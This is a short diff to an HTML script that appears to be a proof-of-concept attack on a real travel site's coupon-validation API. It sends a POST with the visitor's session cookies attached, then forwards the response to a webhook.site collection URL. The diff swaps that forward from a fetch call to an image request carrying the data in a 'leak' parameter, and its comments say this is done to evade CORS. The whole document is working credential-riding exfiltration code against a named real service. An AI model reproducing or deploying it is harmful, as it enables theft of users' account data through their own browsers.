@@ -1,7 +1,7 @@
 <script>
 fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?language=eng&region=in&currency=INR&idContext=B2C&countryCode=IN&requestId=1635a106-b63b-4c0c-a233-c493d61c876f", {
   method: "POST",
-  credentials: "include",  // Important: this sends cookies
+  credentials: "include",
   headers: {
     "Content-Type": "application/json"
   },
@@ -24,9 +24,12 @@ fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?la
 })
 .then(res => res.text())
 .then(body => {
-  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
-    method: "POST",
-    body: body
-  });
+  // encodeURIComponent to safely pass body as URL param
+  let encoded = encodeURIComponent(body.slice(0, 2000)); // truncate to avoid URL length issues
+  let exfilUrl = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encoded;
+
+  // Send via image to avoid CORS
+  let img = new Image();
+  img.src = exfilUrl;
 });
 </script>
